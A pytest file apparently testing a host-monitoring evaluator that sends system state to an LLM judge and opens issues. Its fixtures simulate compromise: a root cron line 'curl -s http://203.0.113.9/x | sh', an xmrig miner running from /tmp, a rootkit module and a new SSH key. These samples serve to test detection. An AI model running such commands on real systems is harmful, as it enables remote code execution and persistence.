        assert len(ev.dumps(context.state)) < 6000, context.id


def test_domain_state_carries_deltas_from_the_previous_observation():
    e, _, _ = make()
    first = host()
    feed(e, first, T0)
    second = copy.deepcopy(first)
    second["cpu.stat"].update(user=100_000 + 6_000, idle=900_000 + 2_000, ctxt=1_060_000)
    second["vmstat"].update(oom_kill=2, pswpout=500)
    second["net.dev"] = netdev("lo", "enp5s0", "docker0", "veth1a2b3c4", rx=61_000)
    second["net.dev"]["interfaces"][1]["rx_errs"] = 5
    second["uptime"]["uptime_s"] = 100.0
    second["firewall"]["hash"] = "ef" * 32
    second["units.files"]["units"]["evil.service"] = "enabled"
    second["kernel.modules"]["modules"].append("rootkit")
    second["ssh.keys.home"]["keys"].append({"path": "/home/alice/.ssh/authorized_keys",
                                            "type": "ssh-rsa", "fingerprint": "SHA256:new",
                                            "comment": "", "options": True})
    feed(e, second, T0 + 60)
    got = {c.id: c.state for c in e.contexts(T0 + 61)}
    cpu = got["cpu"]["cpu.stat"]
    assert cpu["pct"]["user"] == 75.0 and cpu["pct"]["idle"] == 25.0
    assert cpu["ctxt_per_s"] == 1000.0
    assert got["memory"]["vmstat"]["increase"] == {"oom_kill": 2, "pswpout": 500}
    net = got["network"]["net.dev"]
    assert net["added"] == ["veth1a2b3c4"] and net["removed"] == []
    assert net["errors"] == [{"name": "enp5s0", "rx_errs": 5}]
    assert net["busiest"][0] == {"name": "docker0", "rx_bytes_per_s": 1000.0,
                                 "tx_bytes_per_s": 0.0}
    assert got["kernel"]["uptime"]["rebooted"] is True
    assert got["kernel"]["kernel.modules"]["added"] == ["rootkit"]
    assert got["firewall"]["firewall"]["changed"] is True
    assert got["services"]["units.files"]["added"] == ["evil.service"]
    assert got["security"]["ssh.keys.home"]["added"] == ["SHA256:new"]


# --- contexts: entities --------------------------------------------------------------------------


def operator_host(python_cpu_s: int = 40_000) -> dict[str, dict[str, Any]]:
    data = host()
    data["containers"] = containers(
        container("shopfront-web-1"),
        container("shopfront-worker-1", "restarting", exit_code=1,
                  status="Restarting (1) 12 seconds ago"),
        container("shopfront-db-1", health="unhealthy", status="Up 2 hours (unhealthy)"))
    data["units.failed"] = {"units": [{"unit": "casper-md5check.service", "load": "loaded",
                                       "active": "failed", "sub": "failed",
                                       "description": "casper-md5check Verify Live ISO checksums"}],
                            "count": 1}
    data["journal.errors"] = journal(
        {"casper-md5check.service": 3, "nvidia-persistenced.service": 25}, 200,
        [entry("casper-md5check.service", "checksum mismatch", 3),
         entry("nvidia-persistenced.service", "Failed to query NVIDIA devices", 3)])
    data["journal.warnings"] = journal(
        {"openvpn.service": 480, "gnome-shell": 20}, 500,
        [entry("openvpn.service", "Function: route change failed", 4)])
    data["processes"] = processes(
        proc(4242, "python", cpu_pct=250.0, rss_kb=900_000, cpu_s=python_cpu_s),
        proc(5151, "llama-server", cpu_pct=12.0, rss_kb=30_000_000),
        from_tmp=[proc(6666, "xmrig", cpu_pct=5.0, args="/tmp/.x/xmrig -o pool:3333")])
    return data


def test_entities_worth_a_look_each_get_a_context_named_as_rules_name_them():
    e, _, _ = make()
    feed(e, operator_host(), T0)
    after = operator_host(python_cpu_s=40_000 + 600)   # 200% of a core over 300 s
    after["listeners"]["listeners"].append(
        listener("tcp", "0.0.0.0", 6379, "redis-server", 7000, wildcard=True))
    after["gpu"]["gpus"].append(gpu(1))
    feed(e, after, T0 + 300)
    got = {c.entity: c for c in e.contexts(T0 + 301)
           if ContextKind(c.kind) not in (*DOMAINS, ContextKind.JOB)}   # jobs: their own tests
    assert {entity: c.kind for entity, c in got.items()} == {
        "process:6666": "process", "process:4242": "process", "process:5151": "process",
        "unit:casper-md5check.service": "unit",
        "container:shopfront-worker-1": "container",
        "container:shopfront-db-1": "container",
        "listener:tcp/6379": "listener",
        "disk:/dev/nvme0n1": "disk",
        "gpu:0": "gpu_device", "gpu:1": "gpu_device",
        "unit:nvidia-persistenced.service": "log_burst",
        "unit:openvpn.service": "log_burst",
    }
    assert {c.domain for c in got.values()} <= {k.value for k in DOMAINS}
    findings = {f.entity for f in rules.evaluate(e.snapshot(T0 + 301), CONFIG)}
    assert {"container:shopfront-worker-1", "unit:casper-md5check.service",
            "listener:tcp/6379", "unit:openvpn.service"} <= findings
    # context ids are one subject token
    assert all("." not in c.id and " " not in c.id for c in got.values())

    python = got["process:4242"].state
    assert python["why"] == ["cpu"] and python["process"]["comm"] == "python"
    assert python["machine"]["mem_total_kb"] == 131_000_000
    assert got["process:6666"].state["why"] == ["from_tmp"]
    assert got["process:5151"].state["why"] == ["rss"]
    assert got["unit:casper-md5check.service"].state["journal"] == [
        {"source": "casper-md5check.service", "priority": 3, "message": "checksum mismatch"}]
    worker = got["container:shopfront-worker-1"].state
    assert worker["container"]["status"] == "Restarting (1) 12 seconds ago"
    assert worker["previous"]["state"] == "restarting"
    assert got["listener:tcp/6379"].state["sockets"][0]["process"] == "redis-server"
    assert got["listener:tcp/6379"].state["firewall_input"] == [
        {"family": "inet", "table": "filter", "hook": "input", "policy": "drop"}]
    disk = got["disk:/dev/nvme0n1"].state
    assert [f["mount"] for f in disk["filesystems"]] == ["/"]   # not nvme0n10's partition
    assert disk["disk"]["passed"] is True
    vpn = got["unit:openvpn.service"].state
    assert (vpn["source"], vpn["warnings"], vpn["errors"]) == ("openvpn.service", 480, 0)
    assert got["unit:nvidia-persistenced.service"].state["errors"] == 25


def test_a_process_says_whether_it_runs_in_a_container_namespace():
    """Root uvicorn in a compose service read as unexpected root (2026-10-27)."""
    e, _, _ = make()
    uvicorn = proc(4242, "uvicorn", cpu_pct=250.0, user="root", pid_ns="separate",
                   args="/usr/local/bin/python3.12 /usr/local/bin/uvicorn app.main:app")
    feed(e, {"processes": processes(uvicorn), "memory": host()["memory"]}, T0)
    got = {c.entity: c.state for c in e.contexts(T0 + 1)}
    top = got["domain:processes"]["processes"]["top_cpu"][0]
    assert (top["pid"], top["pid_ns"]) == (4242, "separate")
    assert got["process:4242"]["process"]["pid_ns"] == "separate"


def test_a_stopped_containers_stale_health_is_not_evidence():
    """Docker keeps `unhealthy` on a one-shot that exited 0 weeks ago (shopfront-migrate-1,
    2026-10-27): that is its last status, not a check that is failing."""
    e, _, _ = make()
    data = host()
    data["containers"] = containers(
        container("shopfront-migrate-1", "exited", health="unhealthy", exit_code=0,
                  status="Exited (0) 5 weeks ago"),
        container("shopfront-db-1", health="unhealthy", status="Up 2 hours (unhealthy)"))
    feed(e, data, T0)
    got = {c.entity: c for c in e.contexts(T0 + 1)}
    assert "container:shopfront-migrate-1" not in got
    assert got["container:shopfront-db-1"].state["container"]["health"] == "unhealthy"
    rows = {c["name"]: c for c in got["domain:containers"].state["containers"]["containers"]}
    assert rows["shopfront-migrate-1"]["health"] is None
    assert rows["shopfront-db-1"]["health"] == "unhealthy"
    # Once it stops, its health is no evidence either; while it ran, it was.
    data["containers"] = containers(
        container("shopfront-db-1", "restarting", health="unhealthy", exit_code=1,
                  status="Restarting (1) 3 seconds ago"))
    feed(e, data, T0 + 60)
    db = {c.entity: c for c in e.contexts(T0 + 61)}["container:shopfront-db-1"].state
    assert db["container"]["health"] is None and db["previous"]["health"] == "unhealthy"


def test_an_exit_by_signal_is_spelled_out_and_never_reads_as_oom():
    """137 is SIGKILL from anyone; /containers/json has no OOMKilled (imagegen, 2026-10-27)."""
    e, _, _ = make()
    data = host()
    data["containers"] = containers(
        container("imagegen", "exited", exit_code=137, status="Exited (137) 21 hours ago"),
        container("job-1", "exited", exit_code=0, status="Exited (0) 1 hour ago"),
        container("odd-1", "exited", exit_code=128 + 40, status="Exited (168) 1 hour ago"),
        container("worker-1", "restarting", exit_code=143, status="Restarting (143) 1 second"))
    feed(e, data, T0)
    got = {c.entity: c for c in e.contexts(T0 + 1)}
    rows = {c["name"]: c for c in got["domain:containers"].state["containers"]["containers"]}
    assert rows["imagegen"]["exit_meaning"] == (
        "killed by signal 9 (SIGKILL); whether the OOM killer sent it is not reported")
    assert "exit_meaning" not in rows["job-1"]
    assert rows["odd-1"]["exit_meaning"].startswith("killed by signal 40;")   # no name for it
    assert rows["imagegen"]["exit_code"] == 137   # the number stays
    worker = got["container:worker-1"].state["container"]
    assert worker["exit_meaning"].startswith("killed by signal 15 (SIGTERM);")
    assert ev._exit_meaning(True) is None and ev._exit_meaning(128) is None
    assert ev._exit_meaning(128 + 65) is None and ev._exit_meaning(None) is None


def test_each_temperature_carries_its_limit_and_headroom():
    """Tctl at 77 C was read as overheating (2026-10-27): k10temp reports no limit, so the
    state gave a bare number. Readings as `sensors -j` gives them."""
    def temp(chip: str, label: str, value: float, high: float | None = None,
             crit: float | None = None) -> dict[str, Any]:
        return {"chip": chip, "adapter": "PCI adapter", "label": label, "sensor": "temp1",
                "kind": "temp", "input": value, "min": -273.15, "max": high, "crit": crit,
                "alarm": None}

    e, _, _ = make()
    feed(e, {"sensors": {"readings": [
        temp("k10temp-pci-00c3", "Tctl", 77.0), temp("k10temp-pci-00c3", "Tccd1", 68.25),
        temp("nvme-pci-0600", "Composite", 53.85, 74.85, 79.85),
        temp("nvme-pci-0100", "Sensor 1", 53.85, 65261.85),
        temp("coretemp-isa-0000", "Package id 0", 70.0, 80.0, 100.0),
        temp("iwlwifi_1-virtual-0", "temp1", 53.0),
        {"chip": "nct6796-isa-0290", "adapter": "ISA adapter", "label": "fan2",
         "sensor": "fan2", "kind": "fan", "input": 900.0, "min": 0.0, "max": None,
         "crit": None, "alarm": 0.0}], "count": 7}}, T0)
    got = {(r["chip"], r["label"]): r for r in
           next(c for c in e.contexts(T0 + 1) if c.id == "hardware").state["sensors"]}
    cpu = got[("k10temp-pci-00c3", "Tctl")]
    assert (cpu["limit_c"], cpu["limit_source"], cpu["headroom_c"]) == (95, "cpu default", 18.0)
    assert got[("k10temp-pci-00c3", "Tccd1")]["headroom_c"] == 26.8
    nvme = got[("nvme-pci-0600", "Composite")]   # the nearer of its own high and crit
    assert (nvme["limit_c"], nvme["limit_source"], nvme["headroom_c"]) == (74.85, "max", 21.0)
    sentinel = got[("nvme-pci-0100", "Sensor 1")]   # 0xFFFF kelvin is no limit
    assert "max" not in sentinel and "limit_c" not in sentinel and "headroom_c" not in sentinel
    intel = got[("coretemp-isa-0000", "Package id 0")]   # its own limits win over the default
    assert (intel["limit_c"], intel["limit_source"]) == (80.0, "max")
    assert "limit_c" not in got[("iwlwifi_1-virtual-0", "temp1")]   # not a CPU: none stated
    assert got[("nct6796-isa-0290", "fan2")] == {
        "chip": "nct6796-isa-0290", "label": "fan2", "kind": "fan", "input": 900.0,
        "alarm": 0.0}   # not a temperature: as it was


def test_a_gpu_link_is_told_against_its_previous_width_never_its_maximum():
    """GPU0 in a chipset slot is x4 of x16 for good (2026-10-27): the slot, not a fault. The judge
    answered `action` investigate on gpu:0 and on the gpu domain from the bare x4/x16 gap."""
    e, _, _ = make()
    feed(e, {"gpu": {"gpus": [gpu(0, pcie_width=4), gpu(1)], "count": 2}}, T0)

    def states(at: float) -> tuple[dict[int, dict], dict[str, dict]]:
        got = {c.entity: c.state for c in e.contexts(at)}
        domain = {g["index"]: g for g in got["domain:gpu"]["gpu"]["gpus"]}
        return domain, {k: v["gpu"] for k, v in got.items() if k.startswith("gpu:")}

    domain, entity = states(T0 + 1)
    for g in (domain[0], entity["gpu:0"]):   # first sight: a baseline, nothing dropped
        assert "pcie_width_max" not in g and g["pcie_width"] == 4
        assert (g["pcie_width_previous"], g["pcie_width_dropped"]) == (None, False)
    feed(e, {"gpu": {"gpus": [gpu(0, pcie_width=4), gpu(1, pcie_width=8)], "count": 2}},
         T0 + 60)
    domain, entity = states(T0 + 61)
    assert (domain[0]["pcie_width_previous"], domain[0]["pcie_width_dropped"]) == (4, False)
    for g in (domain[1], entity["gpu:1"]):   # x16 -> x8: that is news
        assert (g["pcie_width"], g["pcie_width_previous"], g["pcie_width_dropped"]) == (
            8, 16, True)
    swapped = {**gpu(1, pcie_width=4), "name": "NVIDIA RTX A2000"}   # another card, same index
    feed(e, {"gpu": {"gpus": [gpu(0, pcie_width=4), swapped], "count": 2}}, T0 + 120)
    assert states(T0 + 121)[1]["gpu:1"]["pcie_width_previous"] is None


def test_process_entities_use_recent_cpu_when_there_is_a_previous_sample_and_are_capped():
    e, _, _ = make()
    first = processes(proc(4242, "python", cpu_pct=250.0, cpu_s=40_000))
    feed(e, {"processes": first, "memory": host()["memory"]}, T0)
    idle = processes(proc(4242, "python", cpu_pct=250.0, cpu_s=40_003))   # 1% over 300 s
    feed(e, {"processes": idle}, T0 + 300)
    entities = {c.entity for c in e.contexts(T0 + 301)}
    assert "process:4242" not in entities

    many = processes(*(proc(9000 + n, "cc1plus", cpu_pct=99.0) for n in range(ev.MAX_PROCESSES
                                                                                + 4)))
    feed(e, {"processes": many}, T0 + 600)
    hot = [c for c in e.contexts(T0 + 601) if c.kind == "process"]
    assert len(hot) == ev.MAX_PROCESSES


def test_no_listener_is_new_without_a_baseline_and_loopback_or_standing_ones_never_are():
    e, _, _ = make()
    data = {"listeners": listeners(listener("tcp", "0.0.0.0", 22, "sshd", wildcard=True))}
    feed(e, data, T0)
    assert not [c for c in e.contexts(T0 + 1) if c.kind == "listener"]
    data["listeners"]["listeners"] += [listener("tcp", "127.0.0.1", 9999, "dev"),
                                       listener("udp", "0.0.0.0", 40000, "chrome", wildcard=True)]
    feed(e, data, T0 + 300)
    assert not [c for c in e.contexts(T0 + 301) if c.kind == "listener"]


# --- scheduled work ------------------------------------------------------------------------------


def test_the_snapshot_carries_the_joined_jobs_and_services_for_the_rules():
    e, _, _ = make()
    feed(e, host(), T0)
    snap = e.snapshot(T0 + 1)
    view = {p: v for p, v in host().items() if p in jobs.PROBES}
    assert snap.jobs == tuple(jobs.scheduled(view)[0]) and len(snap.jobs) == 5
    assert snap.services == tuple(jobs.services(view))
    assert snap.previous_services == ()          # no previous observation: no baseline
    later = host()
    later["units.detail"] = detail(*timed("apt-daily", APT), sshd(restarts=4))
    feed(e, {"units.detail": later["units.detail"]}, T0 + 3600)
    snap = e.snapshot(T0 + 3601)
    assert [s["restarts"] for s in snap.previous_services if s["name"] == "ssh.service"] == [0]
    assert [s["restarts"] for s in snap.services if s["name"] == "ssh.service"] == [4]
    loop = [f for f in rules.evaluate(snap, CONFIG) if f.rule == "unit.restart_loop"]
    assert [(f.entity, f.evidence["increase"]) for f in loop] == [("unit:ssh.service", 4)]
    restarted = {c.id: c for c in e.contexts(T0 + 3601)}["services"].state["services"]
    assert restarted["restarted"] == [{"name": "ssh.service", "restarts": 4, "increase": 4}]


def test_the_security_domain_carries_the_job_set_diff_with_commands():
    e, _, _ = make()
    first = host()
    feed(e, first, T0)
    second = copy.deepcopy(first)
    payload = ("root", "* * * * *", "curl -s http://203.0.113.9/x | sh")
    second["cron.d"] = crontab("/etc/cron.d/e2scrub_all", E2SCRUB, payload)
    second["cron.user"] = crontab(SPOOL)
    second["units.detail"] = detail(*timed("apt-daily", "/tmp/apt"), *timed("sync", "/bin/sync"),
                                    sshd())
    feed(e, second, T0 + 3600)
    state = {c.id: c.state for c in e.contexts(T0 + 3601)}
    diff = state["security"]["jobs"]
    added = cron_id("/etc/cron.d/e2scrub_all", *payload)
    assert diff["added"] == [
        {"id": added, "source": "cron", "user": "root", "schedule": "* * * * *",
         "command": payload[2]},
        {"id": "timer:sync.timer", "source": "timer", "user": "root",
         "schedule": "*-*-* 06,18:00:00", "command": "/bin/sync"}]
    assert diff["removed"] == [{"id": cron_id(SPOOL, *BACKUP), "source": "cron",
                                "user": "alice", "schedule": BACKUP[1], "command": BACKUP[2]}]
    assert [j["id"] for j in diff["changed"]] == ["timer:apt-daily.timer"]
    assert diff["changed"][0]["command"] == "/tmp/apt"
    assert (diff["added_count"], diff["removed_count"], diff["changed_count"]) == (2, 1, 1)
    assert state["services"]["services"]["timers"] == {
        "count": 2, "added": ["timer:sync.timer"], "removed": []}


def test_the_job_set_diff_is_bounded_but_its_counts_are_complete(monkeypatch):
    monkeypatch.setattr(ev, "CONTEXT_BUDGET", 10**6)   # 25 new jobs would defer the domain
    e, _, _ = make()
    feed(e, host(), T0)
    many = [("alice", f"{n} * * * *", f"/usr/bin/job{n} " + "x" * 400) for n in range(25)]
    feed(e, {"cron.user": crontab(SPOOL, *many)}, T0 + 3600)
    security = {c.id: c for c in e.contexts(T0 + 3601)}["security"].state
    diff = security["jobs"]
    assert len(diff["added"]) == ev.JOB_CHANGES < diff["added_count"] == 25
    assert all(len(j["command"]) == ev.ARGS_CHARS for j in diff["added"])
    assert diff["removed_count"] == 1 and diff["changed"] == []
    assert len(ev.dumps(security)) < 6000


def test_each_scheduled_job_is_an_entity_whose_state_is_its_definition():
    e, _, _ = make()
    feed(e, host(), T0)
    got = {c.entity: c for c in e.contexts(T0 + 1) if c.kind == "job"}
    found = jobs.scheduled({p: v for p, v in host().items() if p in jobs.PROBES})[0]
    assert set(got) == {f"job:{j['id']}" for j in found} and len(got) == 5
    for job in found:
        context = got[f"job:{job['id']}"]
        assert (context.kind, context.domain, context.state) == ("job", "job", job["static"])
        assert "." not in context.id and " " not in context.id
    assert ev.JOB_DOMAIN == ev.domain_of("job.runs_from_tmp") == ev.domain_of("job.timer_failed")


@pytest.mark.asyncio
async def test_a_job_is_asked_again_only_when_its_definition_changes():
    e, judge, _ = make()
    feed(e, host(), T0)
    feed(e, host(), T0 + 3600)
    await run(e, T0 + 3601)
    assert sum(c.kind == "job" for c in judge.calls[-1]) == 5
    ran = host()   # the timers ran: new last/next and a new result, the same definitions
    ran["units.timers"]["timers"][0].update(last=T0 + 7000, next=T0 + 50_000)
    ran["units.detail"] = detail(*timed("apt-daily", APT, result="exit-code"), sshd())
    feed(e, {p: ran[p] for p in ("units.timers", "units.detail")}, T0 + 7200)
    assert [c.entity for c in e.contexts(T0 + 7201) if c.kind == "job"] == []
    edited = copy.deepcopy(ran)
    edited["units.detail"] = detail(*timed("apt-daily", "/tmp/apt", result="exit-code"),
                                    sshd())
    feed(e, {"units.detail": edited["units.detail"]}, T0 + 10_800)
    assert [c.entity for c in e.contexts(T0 + 10_801) if c.kind == "job"] == [
        "job:timer:apt-daily.timer"]


@pytest.mark.asyncio
async def test_on_a_first_start_changed_domains_go_first_and_new_jobs_fill_the_rest():
    # A job new on first sight is inventory, not a symptom: after every restart the window is
    # empty, so jobs must not hold the domain judgements back. A job a rule touched still leads.
    e, judge, _ = make()
    data = host()
    tmp = ("alice", "@reboot", "/tmp/.x/run")
    data["cron.user"] = crontab(SPOOL, tmp, *(("alice", f"{n} * * * *", f"/usr/bin/job{n}")
                                              for n in range(60)))
    feed(e, data, T0)
    total_jobs = len(e.snapshot(T0 + 1).jobs)
    assert total_jobs * ev.cost(ContextKind.JOB) > ev.CONTEXT_BUDGET   # cannot fit in one pass
    touched = "job:" + cron_id(SPOOL, *tmp)
    per_pass = ev.JOB_SHARE // ev.cost(ContextKind.JOB)
    first: dict[str, int] = {}
    for n in range(-(-total_jobs // per_pass) + 1):
        collation = await run(e, T0 + 1 + n)
        call = judge.calls[-1]
        assert sum(ev.cost(ContextKind(c.kind)) for c in call) <= ev.CONTEXT_BUDGET
        if n == 0:
            entities = [c.entity for c in call]
            assert entities[0] == touched                     # touched: first of all
            assert {f"domain:{k.value}" for k in DOMAINS} <= set(entities)
            jobs_at = [i for i, c in enumerate(call) if c.kind == "job"][1:]
            assert jobs_at and all(ContextKind(c.kind) is ContextKind.JOB
                                   for c in call[jobs_at[0]:])   # the rest is jobs
            assert collation.deferred_contexts > 0
        for c in call:
            if c.kind == "job":   # asked again only on its refresh, never sooner
                assert c.entity not in first or n - first[c.entity] >= ev.REFRESH_EVERY
                first.setdefault(c.entity, n)
        if len(first) == total_jobs:
            break
    assert n >= 1 and len(first) == total_jobs   # spread at JOB_SHARE a pass, each one asked


@pytest.mark.asyncio
async def test_a_crontab_of_tmp_jobs_cannot_starve_the_domains():
    # Every /tmp line raises a finding, so each job is "touched", the top tier. Jobs
    # may still take only JOB_SHARE of a pass, so the domains are judged every pass.
    assert ev.JOB_SHARE == ev.CONTEXT_BUDGET // 3
    e, judge, _ = make()
    data = host()
    # 60 users x 5 lines: under the per-file finding cap, so all 300 jobs are touched.
    spools = [crontab(f"/var/spool/cron/crontabs/u{n}", *((f"u{n}", "@reboot", f"/tmp/x{i}")
                                                         for i in range(5))) for n in range(60)]
    data["cron.user"] = {"files": [f for c in spools for f in c["files"]],
                         "entries": [j for c in spools for j in c["entries"]], "count": 300,
                         "skipped": 0, "redacted": 0}
    domains: set[str] = set()
    for k in range(ev.REFRESH_EVERY * 3):
        data["load"] = {**data["load"], "load1": 1.0 + k}     # the cpu domain changes each pass
        feed(e, data, T0 + 300 * k)
        collation = await run(e, T0 + 300 * k + 1)
        call = judge.calls[-1]
        kinds = [c.kind for c in call]
        assert sum(ev.cost(ContextKind.JOB) for _ in range(kinds.count("job"))) <= ev.JOB_SHARE
        assert "cpu" in {c.id for c in call}, k
        domains |= {c.id for c in call if ContextKind(c.kind) in DOMAINS}
        if k == 0:
            assert kinds[0] == "job"                  # touched jobs still lead, within the share
            # What jobs leave is spent on the rest: every domain, on the first pass.
            assert domains == {d.value for d in DOMAINS}
        assert collation.deferred_contexts > 0          # the rest of the jobs stay due
    assert sum(f.rule == "job.runs_from_tmp" for f in collation.findings) == 300


@pytest.mark.asyncio
async def test_a_job_rule_opens_a_job_issue_and_the_jobs_judgements_attach_to_it():
    command = "/tmp/.x/run --quiet"
    entity = "job:" + cron_id(SPOOL, "alice", "@reboot", command)
    judge = FakeJudge({entity: [("fetches_remote", WARN, True), ("user_persistence", WATCH,
                                                                None)]})
    e, _, _ = make(judge)
    data = host()
    data["cron.user"] = crontab(SPOOL, BACKUP, ("alice", "@reboot", command))
    feed(e, data, T0)
    collation = await run(e, T0 + 1)
    assert judge.calls[-1][0].entity == entity      # touched by a finding: asked first
    issue = only_issue(collation, entity)
    assert (issue.domain, issue.severity, issue.deterministic) == ("job", WARN, True)
    assert issue.reasons == ("job.runs_from_tmp", "fetches_remote", "user_persistence")


# --- changed, unchanged and refresh --------------------------------------------------------------


@pytest.mark.asyncio
async def test_only_contexts_whose_state_changed_are_asked_again():
    e, judge, _ = make()
    feed(e, host(), T0)
    feed(e, host(), T0 + 60)
    await run(e, T0 + 61)
    assert {c.id for c in judge.calls[0]} >= {k.value for k in DOMAINS}
    feed(e, host(), T0 + 120, heartbeat=False)   # the same readings again
    assert e.contexts(T0 + 121) == ()
    changed = host()
    changed["load"]["load1"] = 7.5
    feed(e, {"load": changed["load"]}, T0 + 180, heartbeat=False)
    assert [c.id for c in e.contexts(T0 + 181)] == ["cpu"]


@pytest.mark.asyncio
async def test_unchanged_contexts_are_re_asked_on_the_periodic_refresh():
    e, judge, _ = make()
    feed(e, host(), T0)
    await run(e, T0 + 1)
    everything = {c.id for c in judge.calls[0]}
    for n in range(1, ev.REFRESH_EVERY):
        collation = await run(e, T0 + 1 + n)
        assert collation.questions_asked == 0, n
    await run(e, T0 + 1 + ev.REFRESH_EVERY)
    assert {c.id for c in judge.calls[-1]} == everything


@pytest.mark.asyncio
async def test_a_context_that_got_no_answers_is_asked_again():
    e, judge, _ = make()
    feed(e, host(), T0)
    judge.down = True
    await run(e, T0 + 1)
    judge.down = False
    assert {c.id for c in e.contexts(T0 + 2)} == {c.id for c in judge.calls[0]}


# --- the question budget -------------------------------------------------------------------------


def test_the_budget_is_computed_from_the_banks_and_judge_throughput():
    worst = {kind: len(bank_for(kind)) + sum(q.stability_check for q in bank_for(kind))
             for kind in ContextKind}
    assert all(ev.cost(kind) == worst[kind] for kind in ContextKind)
    assert ev.PASS_QUESTIONS == ev.PASS_S * ev.QUESTIONS_PER_S == 540
    assert ev.CORRELATION_LIMIT * worst[ContextKind.CORRELATION] == ev.CORRELATION_RESERVE
    assert ev.CONTEXT_BUDGET == ev.PASS_QUESTIONS - ev.CORRELATION_RESERVE
    # a full first pass fits
    assert sum(worst[k] for k in DOMAINS) < ev.CONTEXT_BUDGET


async def _primed() -> tuple[Evaluator, FakeJudge]:
    """Everything asked at collation 0; at collation REFRESH_EVERY: a crash loop (touches the
    containers domain and the worker entity), a new hot process (an entity), a changed CPU
    domain and a changed processes domain; every other context is due for refresh."""
    e, judge, _ = make()
    feed(e, host(), T0)
    await run(e, T0 + 1)
    for n in range(1, ev.REFRESH_EVERY):
        await run(e, T0 + 1 + n)
    changed = host()
    changed["containers"] = containers(
        container("shopfront-web-1"),
        container("shopfront-worker-1", "restarting", exit_code=1, status="Restarting (1)"))
    changed["processes"] = processes(proc(4242, "python", cpu_pct=250.0))
    changed["load"]["load1"] = 9.0
    feed(e, {k: changed[k] for k in ("containers", "processes", "load")}, T0 + 10)
    return e, judge


@pytest.mark.asyncio
async def test_due_contexts_are_ordered_touched_then_entities_then_changed_then_refreshes(
        monkeypatch):
    monkeypatch.setattr(ev, "CONTEXT_BUDGET", 10**6)
    e, _ = await _primed()
    order = [c.id if ContextKind(c.kind) in DOMAINS else c.entity
             for c in e.contexts(T0 + 1 + ev.REFRESH_EVERY)]
    assert order[:5] == ["containers", "container:shopfront-worker-1", "process:4242",
                         "cpu", "processes"]
    refreshes = order[5:]
    assert "memory" in refreshes and "disk:/dev/nvme0n1" in refreshes
    assert len(order) == len(set(order))


@pytest.mark.asyncio
async def test_over_the_budget_the_rest_is_deferred_counted_and_asked_next_time(monkeypatch):
    budget = ev.cost(ContextKind.CONTAINERS) + ev.cost(ContextKind.CONTAINER) \
        + ev.cost(ContextKind.PROCESS)
    monkeypatch.setattr(ev, "CONTEXT_BUDGET", budget)
    e, judge = await _primed()
    now = T0 + 1 + ev.REFRESH_EVERY
    due = len(e.contexts(now)) + e.deferred(now)
    collation = await run(e, now)
    asked = [c.entity for c in judge.calls[-1]]
    assert asked == ["domain:containers", "container:shopfront-worker-1", "process:4242"]
    assert collation.deferred_contexts == due - 3 > 0
    assert collation.questions_asked == sum(ev.asks(c) for c in judge.calls[-1])
    monkeypatch.setattr(ev, "CONTEXT_BUDGET", 10**6)
    nxt = await run(e, now + 1)
    assert nxt.deferred_contexts == 0
    assert "domain:cpu" in {c.entity for c in judge.calls[-1]}
    assert "container:shopfront-worker-1" not in {c.entity for c in judge.calls[-1]}


# --- issue lifecycle -----------------------------------------------------------------------------

FAILED = {"units": [{"unit": "casper-md5check.service", "load": "loaded", "active": "failed",
                     "sub": "failed", "description": "casper"}], "count": 1}
HEALTHY_UNITS = {"units": [], "count": 0}
UNIT = "unit:casper-md5check.service"


async def failed_unit(judge: FakeJudge) -> tuple[Evaluator, Collation]:
    e, _, _ = make(judge)
    feed(e, {"units.failed": FAILED}, T0)
    return e, await run(e, T0 + 1)


@pytest.mark.asyncio
async def test_a_deterministic_finding_opens_an_issue_with_a_stable_id():
    e, first = await failed_unit(FakeJudge())
    issue = only_issue(first, UNIT)
    assert (issue.state, issue.severity, issue.domain, issue.deterministic) == (
        OPEN, WARN, "services", True)
    assert issue.reasons == ("unit.failed",) and issue.title == \
        "Unit casper-md5check.service has failed"
    assert issue.opened_at == issue.updated_at == T0 + 1
    feed(e, {"units.failed": FAILED}, T0 + 300)
    again = only_issue(await run(e, T0 + 301), UNIT)
    assert again.id == issue.id and again.opened_at == T0 + 1 and again.updated_at == T0 + 301
    assert issue.id == ev.issue_id("services", UNIT, "unit.failed")


def with_steps(snapshot: rules.Snapshot, config: Config) -> tuple[Finding, ...]:
    """The real rules, each finding carrying a next step."""
    return tuple(dataclasses.replace(f, next_step=f"check {f.entity}")
                 for f in rules.evaluate(snapshot, config))


async def stepped(judge: FakeJudge) -> Issue:
    e = Evaluator(with_steps, judge, FakeCorrelator(related=False), CONFIG, Clock(T0 - 3600))
    feed(e, {"units.failed": FAILED}, T0)
    return only_issue(await e.collate(T0 + 1), UNIT)


@pytest.mark.asyncio
async def test_a_deterministic_issue_takes_its_findings_next_step_when_no_judgement_has_one():
    assert (await stepped(FakeJudge())).next_step == f"check {UNIT}"   # INFO answers, no step
    unstable = FakeJudge({UNIT: [("urgency", CRITICAL, False, {"next_step": "unstable step"})]})
    assert (await stepped(unstable)).next_step == f"check {UNIT}"
    stable = FakeJudge({UNIT: [("urgency", WATCH, True, {"next_step": "journalctl -u x"}),
                               ("quiet", INFO, True)]})
    assert (await stepped(stable)).next_step == "journalctl -u x"


@pytest.mark.asyncio
async def test_a_judgement_raises_a_deterministic_issue():
    judge = FakeJudge({UNIT: [("urgency", CRITICAL, True,
                               {"answer": urgency(3.8), "next_step": "journalctl -u x"}),
                              ("action", WARN, True), ("quiet", INFO, None)]})
    _, collation = await failed_unit(judge)
    issue = only_issue(collation, UNIT)
    assert issue.severity is CRITICAL and issue.deterministic
    assert issue.reasons == ("unit.failed", "urgency", "action")
    assert issue.next_step == "journalctl -u x"
    assert UNIT + "|judged" not in issues_by(collation)   # attached, not a second card


@pytest.mark.asyncio
async def test_a_judgement_never_lowers_or_clears_a_deterministic_issue():
    judge = FakeJudge({UNIT: [("urgency", CRITICAL, True)]})
    e, first = await failed_unit(judge)
    assert only_issue(first, UNIT).severity is CRITICAL
    judge.script[UNIT] = [("healthy", INFO, True), ("fine", INFO, None)]
    for n in range(ev.RESOLVE_AFTER + 2):
        failed = copy.deepcopy(FAILED)
        failed["units"][0]["description"] = f"casper {n}"   # changes state, so it is re-asked
        feed(e, {"units.failed": failed}, T0 + 300 * (n + 1))
        issue = only_issue(await run(e, T0 + 300 * (n + 1) + 1), UNIT)
        assert (issue.state, issue.severity) == (OPEN, WARN), n
        assert UNIT in judge.last   # it was asked, and answered INFO


@pytest.mark.asyncio
async def test_an_unstable_judgement_does_not_raise_a_deterministic_issue():
    judge = FakeJudge({UNIT: [("urgency", CRITICAL, False)]})
    _, collation = await failed_unit(judge)
